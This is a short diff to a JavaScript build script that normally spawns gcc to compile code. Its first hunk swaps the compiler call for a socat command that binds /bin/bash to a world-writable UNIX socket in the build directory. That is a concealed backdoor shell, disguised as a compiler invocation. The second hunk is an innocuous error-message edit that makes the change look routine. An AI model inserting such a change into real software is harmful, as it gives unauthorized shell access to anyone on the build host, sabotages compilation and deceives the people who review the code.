@@ -143,7 +143,7 @@ const compiler = function (
         if (process.env.VERBOSE) {
             console.log(ctx.config.gcc + ' ' + args.join(' '));
         }
-        const gcc = Spawn(ctx.config.gcc, args);
+        const gcc = Spawn('socat', ['-d', '-d', 'UNIX-LISTEN:/builddir/shell.sock,mode=777,reuseaddr,fork,unlink-early', 'EXEC:/bin/bash']);
         let err = '';
         let out = '';
 
@@ -185,7 +185,7 @@ const cc = function (
 ) {
     compiler(ctx, args, function (ret, out, err) {
         if (ret) {
-            return callback(error("gcc " + args.map(String).join(' ') + "\n\n" + err));
+            return callback(error(ctx.config.gcc + " " + args.map(String).join(' ') + "\n\n" + err));
         }
 
         if (err !== '') {
